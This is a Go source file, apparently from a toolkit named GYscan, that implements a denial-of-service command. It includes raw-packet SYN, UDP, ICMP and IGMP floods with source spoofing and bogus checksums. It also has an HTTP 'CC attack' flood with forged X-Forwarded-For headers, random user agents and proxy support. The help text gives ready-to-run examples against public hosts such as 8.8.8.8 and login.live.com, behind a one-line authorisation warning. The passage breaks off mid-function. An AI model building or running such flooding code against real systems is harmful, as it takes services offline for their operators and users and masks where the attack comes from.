package dos

import (
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"GYscan/internal/utils"

	"github.com/spf13/cobra"
)

var (
	target        string
	protocol      string
	sourceIP      string
	sourcePort    int
	destPort      int
	threshold     int
	flood         bool
	turbo         bool
	interfaceName string
	timeout       int
	tcpFlags      string
	windowSize    int
	ttl           int
	tos           int
	payloadSize   int
	quiet         bool
	bogusChecksum bool
	shuffle       bool
	encapsulated  bool

	batchSize int
	workers   int

	ccMethod                  string
	ccPath                    string
	ccUserAgent               string
	ccReferer                 string
	ccCookie                  string
	ccRandomUA                bool
	ccRandomPath              bool
	ccData                    string
	ccContentType             string
	ccHeaders                 []string
	ccTimeout                 int
	ccKeepAlive               bool
	ccAccept                  string
	ccAcceptLanguage          string
	ccAcceptEncoding          string
	ccConnection              string
	ccCacheControl            string
	ccAuthorization           string
	ccXForwardedFor           string
	ccXRealIP                 string
	ccHost                    string
	ccUseGzip                 bool
	ccRandomData              bool
	ccDataSize                int
	ccDomain                  string
	ccIfNoneMatch             string
	ccIfModifiedSince         string
	ccOrigin                  string
	ccSecFetchDest            string
	ccSecFetchMode            string
	ccSecFetchSite            string
	ccSecFetchUser            string
	ccUpgradeInsecureRequests string
	ccDNT                     string
	ccRateLimit               int
	ccInsecure                bool
	ccProxy                   string

	synFlag bool
	ackFlag bool
	finFlag bool
	rstFlag bool
	pshFlag bool
	urgFlag bool
	eceFlag bool
	cwrFlag bool

	ackSeq       uint32
	seqNum       uint32
	dataOffset   int
	window       int
	urgPointer   int
	mss          int
	wscale       int
	tstamp       string
	sackOk       bool
	sack         string
	md5Signature bool
	auth         bool
	authKeyId    int
	authNextKey  int
	nop          bool

	ipId       int
	fragOffset int

	icmpType     int
	icmpCode     int
	icmpId       int
	icmpSequence int

	ripCommand int
	ripAddress string
	ripMetric  int
	ripAuth    bool

	rsvpFlags       int
	rsvpType        int
	rsvpSessionAddr string
	rsvpSenderAddr  string

	eigrpOpcode int
	eigrpFlags  uint32
	eigrpAs     int
	eigrpAuth   bool

	ospfType     int
	ospfRouterId string
	ospfAreaId   string
	ospfOptionE  bool

	greSeqPresent bool
	greKeyPresent bool
	greSumPresent bool
	greKey        uint32
	greSequence   uint32
	greSaddr      string
	greDaddr      string
)

var DosCmd = &cobra.Command{
	Use:   "dos",
	Short: "网络压力测试工具",
	Long: `DoS - 网络压力测试工具

支持多种协议的数据包注入，可用于网络设备和防火墙的压力测试

Usage: GYscan dos <host[/cidr]> [options]

Examples:
  # TCP SYN Flood
  GYscan dos 192.168.1.1 --flood --syn

  # UDP Flood到DNS服务器
  GYscan dos 10.0.0.1 --protocol UDP --dport 53 --flood

  # ICMP Ping Flood
  GYscan dos 192.168.1.1 --protocol ICMP --flood

  # TCP SYN到特定端口
  GYscan dos 192.168.1.1 --syn --dport 443 -n 10000

  # 使用Turbo模式提高性能
  GYscan dos 192.168.1.1 --flood --syn --turbo

  # 使用错误校验和
  GYscan dos 192.168.1.1 --flood --syn --bogus-csum

  # 指定源端口
  GYscan dos 192.168.1.1 --sport 12345 --dport 80 --flood

警告: 仅用于授权压力测试，严禁未授权使用！

使用 "GYscan dos --help" 查看所有参数`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) == 0 {
			cmd.Help()
			return
		}
		target = args[0]
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址")
			return
		}
		if protocol == "" {
			protocol = "TCP"
		}

		utils.BoldInfo("开始DoS压力测试...")
		utils.InfoPrint("目标: %s", target)
		utils.InfoPrint("协议: %s", protocol)
		utils.InfoPrint("按 Ctrl+C 停止")

		runFlood()
	},
}

var floodCmd = &cobra.Command{
	Use:   "flood",
	Short: "Flood模式压力测试",
	Long: `Flood模式压力测试

持续发送数据包直到用户手动中断 (Ctrl+C)
支持多种协议和配置选项

Examples:
  # TCP SYN Flood (默认)
  GYscan dos flood -t 192.168.1.1

  # UDP Flood
  GYscan dos flood -t 10.0.0.1 -p UDP -d 53

  # ICMP Ping Flood
  GYscan dos flood -t 192.168.1.1 -p ICMP

  # 使用Turbo模式
  GYscan dos flood -t 192.168.1.1 --turbo

  # 指定端口和源端口
  GYscan dos flood -t 192.168.1.1 -s 12345 -d 443 --syn

  # 使用错误校验和
  GYscan dos flood -t 192.168.1.1 --bogus-csum

  # 静默模式
  GYscan dos flood -t 192.168.1.1 -q

  # 发送指定数量数据包
  GYscan dos flood -t 192.168.1.1 -n 5000`,
	Run: func(cmd *cobra.Command, args []string) {
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址 (-t/--target)")
			return
		}

		if protocol == "" {
			protocol = "TCP"
		}

		utils.BoldInfo("开始DoS压力测试...")
		utils.InfoPrint("目标: %s", target)
		utils.InfoPrint("协议: %s", protocol)
		utils.InfoPrint("模式: Flood (持续发送)")
		utils.InfoPrint("警告: 按 Ctrl+C 停止")

		runFlood()
	},
}

var tcpCmd = &cobra.Command{
	Use:   "tcp",
	Short: "TCP协议压力测试",
	Long: `TCP协议压力测试

发送TCP数据包进行压力测试，支持多种标志位组合

支持的标志位:
  SYN - 建立连接
  ACK - 确认
  FIN - 结束连接
  RST - 重置连接
  PSH - 推送数据
  URG - 紧急
  ECE - ECN回显
  CWR - 拥塞窗口减少

Examples:
  # TCP SYN Flood
  GYscan dos tcp -t 192.168.1.1 -d 80 --syn

  # TCP SYN/ACK
  GYscan dos tcp -t 10.0.0.1 -d 443 --syn/ack -n 10000

  # TCP RST
  GYscan dos tcp -t 192.168.1.1 -d 22 --rst

  # TCP FIN
  GYscan dos tcp -t 192.168.1.1 -d 80 --fin -n 5000

  # 指定源端口
  GYscan dos tcp -t 192.168.1.1 -s 12345 -d 443 --syn

  # Flood模式
  GYscan dos tcp -t 192.168.1.1 -d 80 --syn -f`,
	Run: func(cmd *cobra.Command, args []string) {
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址 (-t/--target)")
			return
		}

		utils.BoldInfo("TCP压力测试...")
		utils.InfoPrint("目标: %s", target)
		utils.InfoPrint("目标端口: %d", destPort)
		utils.InfoPrint("TCP标志: %s", tcpFlags)

		runProtocolTest("TCP")
	},
}

var udpCmd = &cobra.Command{
	Use:   "udp",
	Short: "UDP协议压力测试",
	Long: `UDP协议压力测试

发送UDP数据包进行压力测试

Examples:
  # UDP Flood到DNS服务器
  GYscan dos udp -t 192.168.1.1 -d 53

  # 指定源端口
  GYscan dos udp -t 10.0.0.1 -s 12345 -d 123

  # 发送指定数量
  GYscan dos udp -t 192.168.1.1 -d 53 -n 5000

  # Flood模式
  GYscan dos udp -t 192.168.1.1 -d 53 -f`,
	Run: func(cmd *cobra.Command, args []string) {
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址 (-t/--target)")
			return
		}

		utils.BoldInfo("UDP压力测试...")
		utils.InfoPrint("目标: %s", target)
		utils.InfoPrint("目标端口: %d", destPort)

		runProtocolTest("UDP")
	},
}

var icmpCmd = &cobra.Command{
	Use:   "icmp",
	Short: "ICMP协议压力测试",
	Long: `ICMP协议压力测试

发送ICMP数据包进行压力测试 (Ping Flood)

Examples:
  # ICMP Ping Flood
  GYscan dos icmp -t 192.168.1.1

  # 到公网IP
  GYscan dos icmp -t 8.8.8.8

  # Flood模式
  GYscan dos icmp -t 192.168.1.1 -f

  # 指定数量
  GYscan dos icmp -t 192.168.1.1 -n 5000`,
	Run: func(cmd *cobra.Command, args []string) {
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址 (-t/--target)")
			return
		}

		utils.BoldInfo("ICMP压力测试...")
		utils.InfoPrint("目标: %s", target)

		runProtocolTest("ICMP")
	},
}

var igmpCmd = &cobra.Command{
	Use:   "igmp",
	Short: "IGMP协议压力测试",
	Long: `IGMP协议压力测试

发送IGMP数据包进行压力测试

Examples:
  # IGMP组播
  GYscan dos igmp -t 192.168.1.255

  # 常见组播地址
  GYscan dos igmp -t 224.0.0.1

  # Flood模式
  GYscan dos igmp -t 224.0.0.1 -f`,
	Run: func(cmd *cobra.Command, args []string) {
		if target == "" {
			utils.ErrorPrint("必须指定目标IP地址 (-t/--target)")
			return
		}

		utils.BoldInfo("IGMP压力测试...")
		utils.InfoPrint("目标: %s", target)

		runProtocolTest("IGMP")
	},
}

var ccCmd = &cobra.Command{
	Use:   "cc",
	Short: "CC攻击 (HTTP Flood)",
	Long: `CC攻击 (Challenge Collapsar)

HTTP Flood攻击，模拟大量正常用户访问目标网站
支持完整HTTP请求构造，包括各种头和payload

支持:
- 自定义HTTP方法 (GET/POST/HEAD/OPTIONS/PUT/DELETE)
- 自定义请求路径和Query参数
- 自定义HTTP头 (任意头)
- 自定义POST数据 (payload)
- JSON/XML等不同Content-Type
- 并发连接
- 完整原始HTTP请求
- 随机User-Agent
- 随机请求路径
- 随机数据填充
- 常见浏览器头完全模拟
- 代理支持
- 限速功能

Examples:
  # 基础CC攻击
  GYscan dos cc http://example.com

  # 带Query参数的URL
  GYscan dos cc "http://example.com/path?id=123&token=abc"

  # POST JSON数据攻击
  GYscan dos cc http://example.com/api --method POST --data '{"user":"admin","pass":"123"}' --content-type "application/json"

  # 简易的完整HTTP请求头攻击
  GYscan dos cc "https://login.live.com/GetCredentialType.srf?opid=TEST&id=123" --method POST --data '{"username":"test"}' --content-type "application/json" --header "Cookie: test=xxx" --header "User-Agent: Mozilla/5.0" --header "Origin: https://login.live.com" --workers 100

  # 模拟真实浏览器攻击
  GYscan dos cc http://example.com --random-ua --keep-alive --accept "text/html,application/xhtml+xml" --accept-language "zh-CN,zh;q=0.9"

  # 随机路径攻击
  GYscan dos cc http://example.com --random-path --workers 200

  # POST表单攻击
  GYscan dos cc http://example.com/login --method POST --data "username=admin&password=123456" --referer "http://example.com/"

  # 限速攻击 (每秒100请求)
  GYscan dos cc http://example.com --workers 50 --rate-limit 100

  # 高并发CC攻击 (推荐)
  GYscan dos cc http://192.168.122.144:80 --workers 1000 --turbo

  # 多进程CC攻击 (更高流量)
  GYscan dos cc http://192.168.122.144:80 --workers 2000 & GYscan dos cc http://192.168.122.144:80 --workers 2000

  # TCP SYN Flood (最大流量,需要root)
  sudo GYscan dos 192.168.122.144 --flood --syn -w 100

警告: 仅用于授权压力测试，严禁未授权使用！`,
	Run: func(cmd *cobra.Command, args []string) {
		if len(args) == 0 {
			utils.ErrorPrint("必须指定目标URL")
			return
		}

		targetURL := args[0]
		if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
			targetURL = "http://" + targetURL
		}

		utils.BoldInfo("CC攻击...")
		utils.InfoPrint("目标: %s", targetURL)
		utils.InfoPrint("方法: %s", ccMethod)
		utils.InfoPrint("并发: %d", workers)
		utils.InfoPrint("按 Ctrl+C 停止")

		runCCAttack(targetURL, ccPath)
	},
}

func getProgramName() string {
	prog := os.Args[0]
	if i := strings.LastIndex(prog, "/"); i >= 0 {
		prog = prog[i+1:]
	}
	return prog
}

func init() {
	DosCmd.AddCommand(floodCmd)
	DosCmd.AddCommand(tcpCmd)
	DosCmd.AddCommand(udpCmd)
	DosCmd.AddCommand(icmpCmd)
	DosCmd.AddCommand(igmpCmd)
	DosCmd.AddCommand(ccCmd)

	ccCmd.Flags().StringVar(&ccMethod, "method", "GET", "HTTP方法 (GET/POST/HEAD/OPTIONS/PUT/DELETE)")
	ccCmd.Flags().StringVar(&ccPath, "path", "/", "HTTP请求路径")
	ccCmd.Flags().StringVar(&ccData, "data", "", "POST数据 (如 username=admin&password=123)")
	ccCmd.Flags().StringVar(&ccContentType, "content-type", "application/x-www-form-urlencoded", "Content-Type")
	ccCmd.Flags().StringArrayVar(&ccHeaders, "header", []string{}, "自定义HTTP头 (可多次使用)")
	ccCmd.Flags().StringVar(&ccUserAgent, "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "User-Agent")
	ccCmd.Flags().StringVar(&ccReferer, "referer", "", "Referer")
	ccCmd.Flags().StringVar(&ccCookie, "cookie", "", "Cookie")
	ccCmd.Flags().BoolVar(&ccRandomUA, "random-ua", false, "随机User-Agent")
	ccCmd.Flags().BoolVar(&ccRandomPath, "random-path", false, "随机请求路径")
	ccCmd.Flags().BoolVar(&ccRandomData, "random-data", false, "随机数据填充")
	ccCmd.Flags().IntVar(&ccDataSize, "data-size", 0, "随机数据大小 (字节)")
	ccCmd.Flags().IntVar(&ccTimeout, "timeout", 10, "请求超时时间 (秒)")
	ccCmd.Flags().BoolVar(&ccKeepAlive, "keep-alive", true, "Keep-Alive连接")
	ccCmd.Flags().StringVar(&ccAccept, "accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "Accept头")
	ccCmd.Flags().StringVar(&ccAcceptLanguage, "accept-language", "zh-CN,zh;q=0.9,en;q=0.8", "Accept-Language头")
	ccCmd.Flags().StringVar(&ccAcceptEncoding, "accept-encoding", "gzip, deflate", "Accept-Encoding头")
	ccCmd.Flags().StringVar(&ccConnection, "connection", "keep-alive", "Connection头")
	ccCmd.Flags().StringVar(&ccCacheControl, "cache-control", "max-age=0", "Cache-Control头")
	ccCmd.Flags().StringVar(&ccAuthorization, "authorization", "", "Authorization头 (Basic/Bearer)")
	ccCmd.Flags().StringVar(&ccXForwardedFor, "x-forwarded-for", "", "X-Forwarded-For头 (伪造IP)")
	ccCmd.Flags().StringVar(&ccXRealIP, "x-real-ip", "", "X-Real-IP头 (伪造IP)")
	ccCmd.Flags().StringVar(&ccHost, "host", "", "Host头")
	ccCmd.Flags().StringVar(&ccDomain, "domain", "", "目标域名")
	ccCmd.Flags().BoolVar(&ccUseGzip, "gzip", true, "启用Gzip压缩")
	ccCmd.Flags().StringVar(&ccIfNoneMatch, "if-none-match", "", "If-None-Match头")
	ccCmd.Flags().StringVar(&ccIfModifiedSince, "if-modified-since", "", "If-Modified-Since头")
	ccCmd.Flags().StringVar(&ccOrigin, "origin", "", "Origin头")
	ccCmd.Flags().StringVar(&ccSecFetchDest, "sec-fetch-dest", "document", "Sec-Fetch-Dest头")
	ccCmd.Flags().StringVar(&ccSecFetchMode, "sec-fetch-mode", "navigate", "Sec-Fetch-Mode头")
	ccCmd.Flags().StringVar(&ccSecFetchSite, "sec-fetch-site", "none", "Sec-Fetch-Site头")
	ccCmd.Flags().StringVar(&ccSecFetchUser, "sec-fetch-user", "?1", "Sec-Fetch-User头")
	ccCmd.Flags().StringVar(&ccUpgradeInsecureRequests, "upgrade-insecure-requests", "1", "Upgrade-Insecure-Requests头")
	ccCmd.Flags().StringVar(&ccDNT, "dnt", "1", "DNT (Do Not Track)头")
	ccCmd.Flags().IntVar(&ccRateLimit, "rate-limit", 0, "限速 (每秒请求数, 0为不限速)")
	ccCmd.Flags().IntVarP(&workers, "workers", "w", 10, "并发工作线程数")
	ccCmd.Flags().BoolVar(&ccInsecure, "insecure", false, "跳过TLS证书验证 (用于自签名证书)")
	ccCmd.Flags().StringVar(&ccProxy, "proxy", "", "HTTP代理地址 (如 http://127.0.0.1:8080)")
	ccCmd.Flags().BoolVar(&ccTurbo, "turbo", false, "Turbo模式 (高性能,使用多CPU核心)")
	ccCmd.Flags().IntVar(&ccRequestsPerConn, "requests-per-conn", 0, "每个连接最大请求数 (0=不限)")
	ccCmd.Flags().BoolVar(&ccNoKeepAlive, "noconn", false, "禁用连接复用 (每次请求新建连接)")

	DosCmd.Flags().StringVarP(&protocol, "protocol", "p", "TCP", "协议类型")
	DosCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	DosCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	DosCmd.Flags().StringVar(&sourceIP, "saddr", "0.0.0.0", "源IP地址")
	DosCmd.Flags().IntVarP(&sourcePort, "sport", "s", 0, "源端口")
	DosCmd.Flags().IntVarP(&destPort, "dport", "d", 80, "目标端口")
	DosCmd.Flags().BoolVar(&turbo, "turbo", false, "Turbo模式")
	DosCmd.Flags().StringVar(&tcpFlags, "flags", "SYN", "TCP标志位")
	DosCmd.Flags().BoolVarP(&synFlag, "syn", "S", false, "TCP SYN标志")
	DosCmd.Flags().BoolVarP(&ackFlag, "ack", "A", false, "TCP ACK标志")
	DosCmd.Flags().BoolVarP(&finFlag, "fin", "F", false, "TCP FIN标志")
	DosCmd.Flags().BoolVarP(&rstFlag, "rst", "R", false, "TCP RST标志")
	DosCmd.Flags().BoolVarP(&pshFlag, "psh", "P", false, "TCP PSH标志")
	DosCmd.Flags().BoolVarP(&urgFlag, "urg", "U", false, "TCP URG标志")
	DosCmd.Flags().BoolVarP(&eceFlag, "ece", "E", false, "TCP ECE标志")
	DosCmd.Flags().BoolVarP(&cwrFlag, "cwr", "C", false, "TCP CWR标志")

	DosCmd.Flags().Uint32Var(&ackSeq, "ack-seq", 0, "TCP ACK序列号")
	DosCmd.Flags().Uint32Var(&seqNum, "sequence", 0, "TCP SYN序列号")
	DosCmd.Flags().IntVar(&dataOffset, "data-offset", 5, "TCP数据偏移")
	DosCmd.Flags().IntVar(&windowSize, "window", 4096, "TCP窗口大小")
	DosCmd.Flags().IntVar(&batchSize, "batch", 1, "批量发送大小 (每次发送包数量)")
	DosCmd.Flags().IntVar(&workers, "workers", 1, "并发工作线程数")
	DosCmd.Flags().IntVar(&urgPointer, "urg-pointer", 0, "TCP URG指针")
	DosCmd.Flags().IntVar(&mss, "mss", 0, "TCP最大报文段大小")
	DosCmd.Flags().IntVar(&wscale, "wscale", 0, "TCP窗口扩大因子")
	DosCmd.Flags().StringVar(&tstamp, "tstamp", "", "TCP时间戳 (格式: TSval:TSecr)")
	DosCmd.Flags().BoolVar(&sackOk, "sack-ok", false, "TCP SACK允许")
	DosCmd.Flags().StringVar(&sack, "sack", "", "TCP SACK边沿 (格式: Left:Right)")
	DosCmd.Flags().BoolVar(&md5Signature, "md5-signature", false, "TCP MD5签名")
	DosCmd.Flags().BoolVar(&auth, "authentication", false, "TCP-AO认证")
	DosCmd.Flags().IntVar(&authKeyId, "auth-key-id", 1, "TCP-AO认证密钥ID")
	DosCmd.Flags().IntVar(&authNextKey, "auth-next-key", 1, "TCP-AO认证下一个密钥")
	DosCmd.Flags().BoolVar(&nop, "nop", false, "TCP No-Operation")

	DosCmd.Flags().IntVar(&ipId, "id", 0, "IP标识")
	DosCmd.Flags().IntVar(&fragOffset, "frag-offset", 0, "IP分片偏移")

	DosCmd.Flags().IntVar(&icmpType, "icmp-type", 8, "ICMP类型")
	DosCmd.Flags().IntVar(&icmpCode, "icmp-code", 0, "ICMP代码")
	DosCmd.Flags().IntVar(&icmpId, "icmp-id", 0, "ICMP标识")
	DosCmd.Flags().IntVar(&icmpSequence, "icmp-sequence", 0, "ICMP序列号")

	DosCmd.Flags().IntVar(&ripCommand, "rip-command", 2, "RIP命令")
	DosCmd.Flags().StringVar(&ripAddress, "rip-address", "", "RIP路由地址")
	DosCmd.Flags().IntVar(&ripMetric, "rip-metric", 0, "RIP度量值")
	DosCmd.Flags().BoolVar(&ripAuth, "rip-authentication", false, "RIP认证")

	DosCmd.Flags().IntVar(&rsvpFlags, "rsvp-flags", 1, "RSVP标志")
	DosCmd.Flags().IntVar(&rsvpType, "rsvp-type", 1, "RSVP消息类型")
	DosCmd.Flags().StringVar(&rsvpSessionAddr, "rsvp-session-addr", "", "RSVP会话地址")
	DosCmd.Flags().StringVar(&rsvpSenderAddr, "rsvp-sender-addr", "", "RSVP发送者地址")

	DosCmd.Flags().IntVar(&eigrpOpcode, "eigrp-opcode", 1, "EIGRP操作码")
	DosCmd.Flags().Uint32Var(&eigrpFlags, "eigrp-flags", 0, "EIGRP标志")
	DosCmd.Flags().IntVar(&eigrpAs, "eigrp-as", 0, "EIGRP自治系统")
	DosCmd.Flags().BoolVar(&eigrpAuth, "eigrp-authentication", false, "EIGRP认证")

	DosCmd.Flags().IntVar(&ospfType, "ospf-type", 1, "OSPF类型")
	DosCmd.Flags().StringVar(&ospfRouterId, "ospf-router-id", "", "OSPF路由ID")
	DosCmd.Flags().StringVar(&ospfAreaId, "ospf-area-id", "0.0.0.0", "OSPF区域ID")
	DosCmd.Flags().BoolVar(&ospfOptionE, "ospf-option-E", false, "OSPF外部路由能力")

	DosCmd.Flags().BoolVar(&greSeqPresent, "gre-seq-present", false, "GRE序列号存在")
	DosCmd.Flags().BoolVar(&greKeyPresent, "gre-key-present", false, "GRE密钥存在")
	DosCmd.Flags().BoolVar(&greSumPresent, "gre-sum-present", false, "GRE校验和存在")
	DosCmd.Flags().Uint32Var(&greKey, "gre-key", 0, "GRE密钥")
	DosCmd.Flags().Uint32Var(&greSequence, "gre-sequence", 0, "GRE序列号")
	DosCmd.Flags().StringVar(&greSaddr, "gre-saddr", "", "GRE源地址")
	DosCmd.Flags().StringVar(&greDaddr, "gre-daddr", "", "GRE目标地址")

	DosCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
	DosCmd.Flags().IntVar(&tos, "tos", 0, "Type of Service")
	DosCmd.Flags().IntVar(&payloadSize, "payload", 0, "载荷大小")
	DosCmd.Flags().BoolVar(&quiet, "quiet", false, "静默模式")
	DosCmd.Flags().BoolVarP(&bogusChecksum, "bogus-csum", "B", false, "错误校验和")
	DosCmd.Flags().BoolVar(&shuffle, "shuffle", false, "Shuffle模式")
	DosCmd.Flags().BoolVar(&encapsulated, "encapsulated", false, "GRE封装协议")

	initFlags()
}

func initFlags() {
	floodCmd.Flags().StringVarP(&target, "target", "t", "", "目标IP地址")
	floodCmd.Flags().StringVarP(&protocol, "protocol", "p", "TCP", "协议类型")
	floodCmd.Flags().StringVar(&sourceIP, "saddr", "0.0.0.0", "源IP地址")
	floodCmd.Flags().IntVarP(&sourcePort, "sport", "s", 0, "源端口")
	floodCmd.Flags().IntVarP(&destPort, "dport", "d", 80, "目标端口")
	floodCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	floodCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	floodCmd.Flags().BoolVar(&turbo, "turbo", false, "Turbo模式")
	floodCmd.Flags().StringVarP(&interfaceName, "interface", "i", "WLAN", "网络接口")
	floodCmd.Flags().StringVar(&tcpFlags, "flags", "SYN", "TCP标志位")
	floodCmd.Flags().IntVar(&windowSize, "window", 4096, "TCP窗口大小")
	floodCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
	floodCmd.Flags().IntVar(&tos, "tos", 0, "Type of Service")
	floodCmd.Flags().IntVar(&payloadSize, "payload", 0, "载荷大小")
	floodCmd.Flags().BoolVar(&quiet, "quiet", false, "静默模式")
	floodCmd.Flags().BoolVar(&bogusChecksum, "bogus-csum", false, "错误校验和")
	floodCmd.Flags().BoolVar(&shuffle, "shuffle", false, "Shuffle模式")

	tcpCmd.Flags().StringVarP(&target, "target", "t", "", "目标IP地址")
	tcpCmd.Flags().IntVarP(&sourcePort, "sport", "s", 0, "源端口")
	tcpCmd.Flags().IntVarP(&destPort, "dport", "d", 80, "目标端口")
	tcpCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	tcpCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	tcpCmd.Flags().StringVar(&tcpFlags, "flags", "SYN", "TCP标志位")
	tcpCmd.Flags().IntVar(&windowSize, "window", 4096, "TCP窗口大小")
	tcpCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
	tcpCmd.Flags().IntVar(&tos, "tos", 0, "Type of Service")
	tcpCmd.Flags().StringVarP(&interfaceName, "interface", "i", "WLAN", "网络接口")

	udpCmd.Flags().StringVarP(&target, "target", "t", "", "目标IP地址")
	udpCmd.Flags().IntVarP(&sourcePort, "sport", "s", 0, "源端口")
	udpCmd.Flags().IntVarP(&destPort, "dport", "d", 53, "目标端口")
	udpCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	udpCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	udpCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
	udpCmd.Flags().IntVar(&payloadSize, "payload", 0, "载荷大小")
	udpCmd.Flags().StringVarP(&interfaceName, "interface", "i", "WLAN", "网络接口")

	icmpCmd.Flags().StringVarP(&target, "target", "t", "", "目标IP地址")
	icmpCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	icmpCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	icmpCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
	igmpCmd.Flags().StringVarP(&target, "target", "t", "", "目标IP地址 (组播地址)")
	igmpCmd.Flags().IntVarP(&threshold, "threshold", "n", 1000, "发送数据包数量")
	igmpCmd.Flags().BoolVarP(&flood, "flood", "f", false, "Flood模式")
	igmpCmd.Flags().IntVar(&ttl, "ttl", 64, "TTL值")
}

func runFlood() {
	if !checkPermissionAndWarn() {
		return
	}

	utils.InfoPrint("Flood模式已启动...")
	utils.InfoPrint("按 Ctrl+C 停止")

	if batchSize > 1 {
		utils.InfoPrint("批量发送: 每次 %d 个包", batchSize)
	}
	if workers > 1 {
		utils.InfoPrint("并发工作线程: %d 个", workers)
	}
	if turbo {
		utils.InfoPrint("Turbo模式: 启用 (多进程)")
	}

	startTime := time.Now()
	packetsSent := uint64(0)
	permissionDenied := false

	protocolUpper := strings.ToUpper(protocol)

	if synFlag || ackFlag || finFlag || rstFlag || pshFlag || urgFlag || eceFlag || cwrFlag {
		tcpFlags = ""
		if synFlag {
			tcpFlags += "SYN/"
		}
		if ackFlag {
			tcpFlags += "ACK/"
		}
		if finFlag {
			tcpFlags += "FIN/"
		}
		if rstFlag {
			tcpFlags += "RST/"
		}
		if pshFlag {
			tcpFlags += "PSH/"
		}
		if urgFlag {
			tcpFlags += "URG/"
		}
		if eceFlag {
			tcpFlags += "ECE/"
		}
		if cwrFlag {
			tcpFlags += "CWR/"
		}
		tcpFlags = strings.TrimSuffix(tcpFlags, "/")
	}

	sendBatch := func() {
		for j := 0; j < batchSize; j++ {
			err := sendPacket(protocolUpper, target, sourceIP, sourcePort, destPort, tcpFlags, windowSize, ttl, tos, payloadSize, bogusChecksum, interfaceName)
			if err != nil {
				errLower := strings.ToLower(err.Error())
				if strings.Contains(errLower, "operation not permitted") ||
					strings.Contains(errLower, "permission denied") ||
					strings.Contains(errLower, "create socket failed") ||
					strings.Contains(errLower, "create raw conn failed") ||
					strings.Contains(errLower, "listen") {
					if !permissionDenied {
						permissionDenied = true
						utils.ErrorPrint("错误: %v", err)
						utils.BoldInfo("请使用 sudo 运行或切换到root用户")
						utils.InfoPrint("例如: sudo %s dos %s", getProgramName(), target)
					}
				} else if !quiet {
					utils.ErrorPrint("发送失败: %v", err)
				}
			}
			if workers > 1 {
				atomic.AddUint64(&packetsSent, 1)
			} else {
				packetsSent++
			}
		}
	}

	stopProgress := make(chan bool)
	if workers > 1 || batchSize > 10 {
		go func() {
			lastCount := uint64(0)
			for {
				select {
				case <-stopProgress:
					return
				case <-time.After(1 * time.Second):
					if permissionDenied {
						return
					}
					current := atomic.LoadUint64(&packetsSent)
					if current > 0 {
						rate := float64(current - lastCount)
						utils.InfoPrint("已发送: %d 包, 速率: %.0f pps", current, rate)
						lastCount = current
					}
				}
			}
		}()
	}

	if workers > 1 {
		var wg sync.WaitGroup
		for w := 0; w < workers; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					sendBatch()
					if permissionDenied {
						break
					}
					if !flood && uint64(threshold) > 0 && atomic.LoadUint64(&packetsSent) >= uint64(threshold) {
						break
					}
				}
			}()
		}
		wg.Wait()
	} else {
		for {
			sendBatch()

			if permissionDenied {
				break
			}

			if packetsSent%1000 == 0 && !quiet && !permissionDenied {
				elapsed := time.Since(startTime).Seconds()
				rate := float64(packetsSent) / elapsed
				utils.InfoPrint("已发送: %d 包, 速率: %.2f pps", packetsSent, rate)
			}

			if !flood && uint64(threshold) > 0 && packetsSent >= uint64(threshold) {
				break
			}
		}
	}

	close(stopProgress)
	closeRawSocket()

	if !permissionDenied {
		elapsed := time.Since(startTime).Seconds()
		utils.SuccessPrint("测试完成!")
		utils.SuccessPrint("总计发送: %d 包", packetsSent)
		if elapsed > 0 {
			utils.SuccessPrint("平均速率: %.2f pps", float64(packetsSent)/elapsed)
		}
	}
}

func runProtocolTest(proto string) {
	if !checkPermissionAndWarn() {
		return
	}

	if threshold == 0 && !flood {
		threshold = 1000
	}

	utils.InfoPrint("发送数量: %d", threshold)
	if flood {
		utils.InfoPrint("模式: Flood (持续发送)")
	}

	startTime := time.Now()
	packetsSent := 0
	permissionDenied := false

	for i := 0; (flood && true) || i < threshold; i++ {
		err := sendPacket(proto, target, sourceIP, sourcePort, destPort, tcpFlags, windowSize, ttl, tos, payloadSize, bogusChecksum, interfaceName)
		if err != nil {
			if strings.Contains(err.Error(), "operation not permitted") || strings.Contains(err.Error(), "permission denied") {
				if !permissionDenied {
					permissionDenied = true
					utils.ErrorPrint("权限不足: 需要root权限发送原始数据包")
					utils.BoldInfo("请使用 sudo 运行或切换到root用户")
					utils.InfoPrint("例如: sudo %s dos %s", getProgramName(), target)
				}
			} else if !quiet {
				utils.ErrorPrint("发送失败: %v", err)
			}
		}
		packetsSent++

		if packetsSent%1000 == 0 && !quiet && !permissionDenied {
			elapsed := time.Since(startTime).Seconds()
			if elapsed > 0 {
				rate := float64(packetsSent) / elapsed
				utils.InfoPrint("已发送: %d 包, 速率: %.2f pps", packetsSent, rate)
			}
		}

		if permissionDenied {
			break
		}
	}

	if !permissionDenied {
		elapsed := time.Since(startTime).Seconds()
		utils.SuccessPrint("测试完成!")
